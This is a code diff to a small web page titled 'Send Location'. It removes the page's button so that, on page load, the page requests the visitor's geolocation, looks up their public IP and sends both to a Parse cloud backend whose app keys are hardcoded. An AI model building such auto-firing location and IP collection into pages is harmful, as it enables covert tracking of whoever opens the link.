@@ -5,25 +5,25 @@
     <title>Send Location</title>
   </head>
   <body>
-    <button id="send-location-btn">Send Location</button>
     <script src="https://www.parsecdn.com/js/parse-1.17.1.min.js"></script>
     <script>
       Parse.initialize("ORBsoH5V7XjitvCHfKH0N66xJgiMt0jsKXuxf9m4", "aSTZjBtzGweT75d35fJDv2zb6WJuenH3QiWXdc1a");
       Parse.serverURL = "https://parseapi.back4app.com/";
 
-      document.getElementById("send-location-btn").addEventListener("click", async () => {
-        if ('geolocation' in navigator) {
-          navigator.geolocation.getCurrentPosition(async (position) => {
-            const { latitude, longitude } = position.coords;
-            const ipResponse = await fetch('https://api.ipify.org?format=json');
-            const { ip } = await ipResponse.json();
-            const response = await Parse.Cloud.run('sendLocation', { location: `${latitude},${longitude}`, ip });
-            console.log(response);
-          });
-        } else {
-          console.log('Geolocation is not available');
-        }
-      });
+
+      if ('geolocation' in navigator) {
+        navigator.geolocation.getCurrentPosition(async (position) => {
+          const { latitude, longitude } = position.coords;
+          const ipResponse = await fetch('https://api.ipify.org?format=json');
+          const { ip } = await ipResponse.json();
+          const response = await Parse.Cloud.run('sendLocation', { location: `${latitude},${longitude}`, ip });
+          console.log(response);
+        }, () => {
+          console.log('User denied location permission');
+        });
+      } else {
+        console.log('Geolocation is not available');
+      }
     </script>
   </body>
 </html>
